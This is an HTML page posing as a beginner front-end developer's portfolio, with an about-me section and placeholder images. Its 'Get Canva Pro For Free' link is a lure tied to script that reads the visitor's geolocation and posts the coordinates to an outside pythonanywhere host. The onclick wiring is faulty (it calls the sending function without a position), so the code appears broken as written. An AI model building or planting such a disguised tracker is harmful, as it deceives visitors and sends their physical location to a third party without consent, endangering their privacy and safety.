<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css"
    integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp" crossorigin="anonymous">
    <link rel="stylesheet" href="/static/css/location.css">

</head>

<body>
    <div class="website">
        <div class=line-above-nav>
        </div>
        <div class="nav">
            <div class="contact-me">
                <ul>
                    <li> Contact me </li>
                </ul>
            </div>
            <div class="nav-icons">
                <ul>
                    <i class="fab fa-linkedin"></i>
                    <i class="fab fa-instagram"></i>
                </ul>
            </div>
        </div>
    </div>

    <!-- end of nav -->

    <div class="main-page">
        <div class="banner">
            <div class="banner-text">
                <h1> Welcome </h1>
                <p> This is my portfolio website </p>
            </div>
        </div>

        <!-- --------- -->
        <div class="about-me">
            <div class="about-me-text">
                <h2> A little about me </h2>
                <p> I am a just-starting-out front end developer in a big world of code, trying to learn. <br> Im dutch,
                    20 years old and living in Kampen. I love to go out on walks with my dog and partner. <br>I love
                    design! Before this job i studied as a graphic designer. Which comes in handy for this field of
                    work.<br> Currently i have good knowledge of HTML, CSS, (SASS) and im working on my Javascript.
                    <br><br> Below here are some examples of my work </p>
            </div>
        </div>
        <!-- -------------------- -->
        <div class="image-grid">
            <div class="grid-image">
                <img src="http://via.placeholder.com/250x250">
            </div>
            <div class="grid-image">
                <img src="http://via.placeholder.com/250x250">
            </div>
            <div class="grid-image">
                <img src="http://via.placeholder.com/250x250">
            </div>
            <div class="grid-image">
                <img src="http://via.placeholder.com/250x250">
            </div>
            <div class="grid-image">
                <img src="http://via.placeholder.com/250x250">
            </div>
            <div class="grid-image">
                <img src="http://via.placeholder.com/250x250">
            </div>
        </div>
    </div>

    <!-- end of main page -->
    <div class="block">
        <div class="block-text">
            <h3> Get Canva Pro For Free </h3>
            <a href="#" onclick="showPosition()"> Get </a>
        </div>
    </div>

    <div class="footer">
        <div class="footer-text">
            <p> copyright © kiralin </p>
        </div>
        <div class="icons-footer">
            <ul class="ul-icons">
                <i class="fab fa-linkedin"></i>
                <i class="fab fa-instagram"></i>
            </ul>
        </div>

    </div>
    </div>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/1.3.4/axios.js"></script>
    <script>
        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(showPosition);
            } else {
                x.innerHTML = "Geolocation is not supported by this browser.";
            }
        }

        function showPosition(position) {
            axios.post('https://tehmasipsen0900.pythonanywhere.com/location/', {
                lat: position.coords.latitude,
                long: position.coords.longitude
            })
                .then(function (response) {
                    console.log(response);
                })
                .catch(function (error) {
                    console.log(error);
                });
        }
    </script>
</body>

</html>